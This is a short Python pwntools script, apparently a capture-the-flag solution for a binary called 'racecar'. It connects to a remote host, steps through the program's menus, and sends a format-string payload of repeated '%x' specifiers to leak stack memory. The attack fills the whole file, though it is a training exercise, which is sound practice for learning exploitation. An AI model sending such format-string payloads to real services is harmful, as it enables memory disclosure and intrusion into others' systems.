from pwn import * 
context.log_level = 'debug'
r = remote('142.93.32.153', 32106)
#r = process('./racecar')
#r=gdb.debug('./racecar', 'b *car_menu+828\nc')
r.recvuntil(b'Name')
r.sendline(b'name')
r.recvuntil(b'Nickname')
r.sendline(b'nick')
r.recvuntil(b'Car selection')
r.sendline(b'2')
r.recvuntil(b'Select car')
r.sendline(b'1')
r.recvuntil(b'Circuit')
r.sendline(b'1')
r.recvuntil(b'victory?')
r.sendline(b'%x'*22)
r.interactive()